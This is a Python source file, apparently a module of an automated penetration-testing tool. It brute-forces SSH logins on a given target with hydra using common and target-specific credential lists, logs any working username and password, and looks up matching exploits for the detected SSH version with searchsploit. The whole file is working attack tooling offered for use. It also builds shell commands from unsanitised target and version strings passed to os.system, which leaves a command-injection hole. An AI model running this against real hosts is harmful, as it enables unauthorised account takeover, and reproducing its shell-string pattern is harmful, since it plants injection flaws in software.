import os
import sys
import json
import re

def log_result(target, content):
    log_path = f"logs/{target}/ssh/credentials_found.txt"
    os.makedirs(os.path.dirname(log_path), exist_ok=True)
    with open(log_path, "w") as logf:
        logf.write(content)
    os.system("cp " + log_path + " logs/" + target + "/report/ssh_credentials_found.txt")

def ssh_bruteforce(target, port: int = 22):
    print("[*] Starting SSH bruteforce...")
    found = False
    valid_credentials = None

    wordlist_path = "wordlists/misc/common_credentials.txt"
    default_output = f"logs/{target}/ssh/hydra_default_output.txt"
    os.makedirs(f"logs/{target}/ssh", exist_ok=True)
    cmd = f"hydra -C {wordlist_path} -s {port} -o {default_output} -f {target} ssh > /dev/null 2>&1"
    os.system(cmd)
    try:
        with open(default_output, "r") as f:
            output = f.read()
        match = re.search(r'login:\s*(\S+)\s+password:\s*(\S+)', output)
        if match:
            user, pwd = match.group(1), match.group(2)
            print(f"[+] Valid credentials found: {user}:{pwd}")
            valid_credentials = f"Weak SSH credentials found: {user}:{pwd}"
            found = True
    except Exception:
        pass

    custom_users_path = f"wordlists/{target}/users.txt"
    if not found and os.path.exists(custom_users_path):
        try:
            with open(custom_users_path, "r") as f:
                custom_users = [line.strip() for line in f if line.strip()]
        except Exception:
            custom_users = []

        passwords = []
        try:
            with open(wordlist_path, "r") as f:
                for line in f:
                    line = line.strip()
                    if ":" in line:
                        _, pwd = line.split(":", 1)
                        passwords.append(pwd)
        except Exception:
            pass

        try:
            with open(custom_users_path, "r") as f:
                for line in f:
                    pwd = line.strip()
                    if pwd:
                        passwords.append(pwd)
        except Exception:
            pass

        tmp_users_file = f"logs/{target}/ssh/tmp_users.txt"
        tmp_passwords_file = f"logs/{target}/ssh/tmp_passwords.txt"
        with open(tmp_users_file, "w") as uf:
            for user in custom_users:
                uf.write(user + "\n")
        with open(tmp_passwords_file, "w") as pf:
            for pwd in passwords:
                pf.write(pwd + "\n")

        custom_output = f"logs/{target}/ssh/hydra_custom_output.txt"
        cmd = f"hydra -L {tmp_users_file} -P {tmp_passwords_file} -s {port} -o {custom_output} -f {target} ssh > /dev/null 2>&1"
        os.system(cmd)
        try:
            with open(custom_output, "r") as f:
                output = f.read()
            match = re.search(r'login:\s*(\S+)\s+password:\s*(\S+)', output)
            if match:
                user, pwd = match.group(1), match.group(2)
                print(f"[+] Valid credentials found: {user}:{pwd}")
                valid_credentials = f"Weak SSH credentials found: {user}:{pwd}"
                found = True
        except Exception:
            pass

        try:
            os.remove(tmp_users_file)
            os.remove(tmp_passwords_file)
        except Exception:
            pass

    if valid_credentials:
        log_result(target, valid_credentials)
    else:
        print("[-] No valid SSH credentials found.")

def ssh_grep_searchsploit(target):
    searchsploit_file = f"logs/{target}/ssh/searchsploit.txt"
    try:
        with open(searchsploit_file, "r") as f:
            data = json.load(f)
    except Exception:
        print(f"[!] Error reading the file {searchsploit_file}")
        return

    cves = []
    for result in data.get("RESULTS_EXPLOIT", []):
        cve = result.get("Title")
        if cve:
            cves.append(cve)

    if cves:
        print(f"[+] CVEs found: {', '.join(cves)}")
        report_path = f"logs/{target}/report/ssh_cves.txt"
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        with open(report_path, "w") as rep:
            for cve in cves:
                rep.write(f"\n{cve}")
    else:
        print("[-] No CVEs found in the searchsploit output.")

def ssh_searchsploit(target):
    print("[*] Retrieving SSH version...")
    nmap_file = f"logs/{target}/nmap/ports_services_versions.txt"
    try:
        with open(nmap_file, "r") as f:
            lines = f.readlines()
    except Exception:
        print(f"[!] Error reading the file {nmap_file}")
        return

    ssh_version = None
    for line in lines:
        if line.startswith("PORT") or line.strip() == "":
            continue
        parts = line.split()
        if len(parts) >= 4 and parts[0].startswith("22") and "ssh" in parts[2].lower():
            ssh_version = " ".join(parts[3:])
            break

    if ssh_version is None:
        print("[-] No SSH version information found in the Nmap file.")
        return

    print(f"[+] SSH version found: {ssh_version}")
    print("[*] Searching for CVEs...")

    ssh_dir = f"logs/{target}/ssh"
    os.makedirs(ssh_dir, exist_ok=True)
    searchsploit_file = f"{ssh_dir}/searchsploit.txt"
    cmd = f'searchsploit "{ssh_version}" -j > {searchsploit_file}'
    try:
        os.system(cmd)
        print(f"[+] Results saved in {searchsploit_file}")
        ssh_grep_searchsploit(target)
    except Exception as e:
        print(f"[!] Error executing searchsploit: {e}")

def run_ssh(target):
    print(f"[*] Running SSH module...")
    ssh_bruteforce(target)
    ssh_searchsploit(target)
    print("[+] SSH module completed.")

if __name__ == "__main__":
    run_ssh(sys.argv[1])
